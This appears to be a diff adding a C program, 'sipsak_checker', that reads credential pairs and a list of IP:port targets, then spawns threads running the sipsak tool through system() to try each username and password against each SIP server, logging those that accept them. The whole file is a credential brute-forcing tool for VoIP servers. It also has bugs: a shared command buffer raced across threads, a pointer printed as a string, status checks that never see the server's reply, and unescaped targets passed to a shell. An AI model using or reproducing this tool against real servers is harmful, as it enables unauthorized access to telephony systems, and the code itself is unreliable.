@@ -1,0 +1,245 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <pthread.h>
+#include <getopt.h>
+
+#define MAX_USERNAME_LEN 50
+#define MAX_PASSWORD_LEN 50
+#define MAX_TARGET_LEN 100
+#define MAX_SUCCESS_RESULTS 1000
+#define MAX_RESERVATIONS 1000
+
+char defaultUser[] = "MOH100";
+char defaultPass[] = "12345";
+char User_Pass[] = "User_Pass";
+char ipFile[] = "ip.txt";
+char successFile[] = "Success_results.txt";
+char reservationsFile[] = "reservations_targets.txt";
+
+char sipsakCmd[MAX_TARGET_LEN + 100] = { 0 };
+char successResults[MAX_SUCCESS_RESULTS][MAX_TARGET_LEN];
+char reservations[MAX_RESERVATIONS][MAX_TARGET_LEN];
+
+int numSuccessResults = 0;
+int numReservations = 0;
+
+struct UserInfo {
+    char username[MAX_USERNAME_LEN];
+    char password[MAX_PASSWORD_LEN];
+};
+
+struct TargetInfo {
+    char target[MAX_TARGET_LEN];
+    int port;
+};
+
+struct TestJob {
+    struct UserInfo userInfo;
+    struct TargetInfo targetInfo;
+};
+
+void printUsage() {
+    printf("Usage: ./sipsak_checker [udp|tcp|tls] [num_threads] [num_targets]\n");
+}
+
+void readUserPass(struct UserInfo *userInfoArr, int *numUsers) {
+    FILE *fp;
+    char buffer[MAX_USERNAME_LEN + MAX_PASSWORD_LEN + 2];
+    char *p;
+    int i = 0;
+    fp = fopen(User_Pass, "r");
+    if (fp == NULL) {
+        perror("Error opening User_Pass file");
+        exit(EXIT_FAILURE);
+    }
+    while (fgets(buffer, MAX_USERNAME_LEN + MAX_PASSWORD_LEN + 2, fp) != NULL) {
+        p = strtok(buffer, " \t\n");
+        if (p != NULL) {
+            strcpy(userInfoArr[i].username, p);
+        }
+        p = strtok(NULL, " \t\n");
+        if (p != NULL) {
+            strcpy(userInfoArr[i].password, p);
+        }
+        i++;
+    }
+    *numUsers = i;
+    fclose(fp);
+}
+
+void readTargets(struct TargetInfo *targetInfoArr, int *numTargets) {
+    FILE *fp;
+    char buffer[MAX_TARGET_LEN + 10];
+    char *p;
+    int i = 0;
+    fp = fopen(ipFile, "r");
+    if (fp == NULL) {
+        perror("Error opening ip.txt file");
+        exit(EXIT_FAILURE);
+    }
+    while (fgets(buffer, MAX_TARGET_LEN + 10, fp) != NULL) {
+        p = strtok(buffer, ":");
+        if (p != NULL) {
+            strcpy(targetInfoArr[i].target, p);
+        }
+        p = strtok(NULL, ":\n");
+        if (p != NULL) {
+            targetInfoArr[i].port = atoi(p);
+        }
+        i++;
+    }
+    *numTargets = i;
+    fclose(fp);
+}
+
+void logSuccessResult(char *target) {
+    FILE *fp;
+    fp = fopen(successFile, "a");
+    if (fp == NULL) {
+        perror("Error opening Success_results.txt file");
+        exit(EXIT_FAILURE);
+    }
+    fprintf(fp, "%s\n", target);
+    fclose(fp);
+}
+
+void logReservation(char *target) {
+    FILE *fp;
+    fp = fopen(reservationsFile, "a");
+    if (fp == NULL) {
+        perror("Error opening reservations_targets.txt file");
+        exit(EXIT_FAILURE);
+    }
+    fprintf(fp, "%s\n", target);
+    fclose(fp);
+}
+
+void *testTargets(void *arg) {
+    struct TestJob *job = (struct TestJob*)arg;
+    char target[MAX_TARGET_LEN];
+    char response[100];
+    int i, res;
+    for (i = 0; i < MAX_TARGET_LEN; i++) {
+        target[i] = job->targetInfo.target[i];
+        if (target[i] == '\0') {
+            break;
+        }
+    }
+    sprintf(sipsakCmd, "sipsak -U -C sip:%s -s sip:%s:%d -u %s -a %s -H %s -i -vvv -E %s",
+        target, target, job->targetInfo.port, job->userInfo.username, job->userInfo.password, target, arg);
+    for (i = 0; i < 3; i++) {
+        res = system(sipsakCmd);
+        if (res == 0) {
+            sprintf(response, "%d OK", res);
+            printf("%s\n", response);
+            strcpy(successResults[numSuccessResults], target);
+            numSuccessResults++;
+            logSuccessResult(target);
+            break;
+        }
+        else {
+            sprintf(response, "%d", res);
+            printf("%s\n", response);
+        }
+        sleep(1); // wait for 1 second before the next attempt
+    }
+    if (i == 3) {
+        if (strstr(response, "401 Unauthorized") != NULL) {
+            printf("Target %s requires authentication\n", target);
+            logReservation(target);
+        }
+        else if (strstr(response, "407 Proxy Authentication Required") != NULL) {
+            printf("Target %s requires proxy authentication\n", target);
+            logReservation(target);
+        }
+        else if (strstr(response, "200 OK") != NULL) {
+            printf("Target %s responded with 200 OK\n", target);
+            strcpy(successResults[numSuccessResults], target);
+            numSuccessResults++;
+            logSuccessResult(target);
+        }
+        else if (strstr(response, "202 Accepted") != NULL) {
+            printf("Target %s responded with 202 Accepted\n", target);
+            strcpy(successResults[numSuccessResults], target);
+            numSuccessResults++;
+            logSuccessResult(target);
+        }
+        else if (strstr(response, "204 No Notification") != NULL) {
+            printf("Target %s responded with 204 No Notification\n", target);
+            strcpy(successResults[numSuccessResults], target);
+            numSuccessResults++;
+            logSuccessResult(target);
+        }
+        else {
+            printf("Target %s did not respond with a successful message\n", target);
+        }
+    }
+    free(job);
+    pthread_exit(NULL);
+}
+
+int main(int argc, char *argv[]) {
+    if (argc != 4) {
+        printUsage();
+        exit(EXIT_FAILURE);
+    }
+    int numThreads = atoi(argv[2]);
+    int numTargets = atoi(argv[3]);
+    if (numThreads <= 0 || numTargets <= 0) {
+        printf("Error: num_threads and num_targets must be positive integers\n");
+        exit(EXIT_FAILURE);
+    }
+    char *protocol = argv[1];
+    if (strcmp(protocol, "udp") != 0 && strcmp(protocol, "tcp") != 0 && strcmp(protocol, "tls") != 0) {
+        printf("Error: unsupported protocol %s\n", protocol);
+        exit(EXIT_FAILURE);
+    }
+    printf("Testing with %d threads and %d targets using %s protocol\n", numThreads, numTargets, protocol);
+    struct UserInfo userInfoArr[100];
+    int numUsers = 0;
+    readUserPass(userInfoArr, &numUsers);
+    printf("Read %d usernames and passwords from %s\n", numUsers, User_Pass);
+    struct TargetInfo targetInfoArr[10000];
+    int i, j, numPerThread, numLeftover, numTotal = 0;
+    readTargets(targetInfoArr, &numTotal);
+    printf("Read %d targets from %s\n", numTotal, ipFile);
+    pthread_t threads[numThreads];
+    for (i = 0; i < numThreads; i++) {
+        numPerThread = numTargets / numThreads;
+        numLeftover = numTargets % numThreads;
+        if (i < numLeftover) {
+            numPerThread++;
+        }
+        struct TestJob *jobs[numPerThread * numUsers];
+        int numJobs = 0;
+        for (j = 0; j < numTargets; j++) {
+            if (j % numThreads == i) {
+                if (numJobs >= numPerThread * numUsers) {
+                    break;
+                }
+                int k;
+                for (k = 0; k < numUsers; k++) {
+                    if (strcmp(userInfoArr[k].username, defaultUser) != 0 || strcmp(userInfoArr[k].password, defaultPass) != 0) {
+                        struct TestJob *job = (struct TestJob*)malloc(sizeof(struct TestJob));
+                        job->userInfo = userInfoArr[k];
+                        job->targetInfo = targetInfoArr[j];
+                        jobs[numJobs] = job;
+                        numJobs++;
+                    }
+                }
+            }
+        }
+        printf("Thread %d will test %d targets\n", i, numJobs / numUsers);
+        int t;
+        for (t = 0; t < numJobs; t++) {
+            pthread_create(&threads[i], NULL, testTargets, jobs[t]);
+        }
+    }
+    for (i = 0; i < numThreads; i++) {
+        pthread_join(threads[i], NULL);
+    }
+    printf("Test completed. %d targets accepted valid credentials, and %d targets did not accept default credentials\n", numSuccessResults, numReservations);
+    exit(EXIT_SUCCESS);
+}
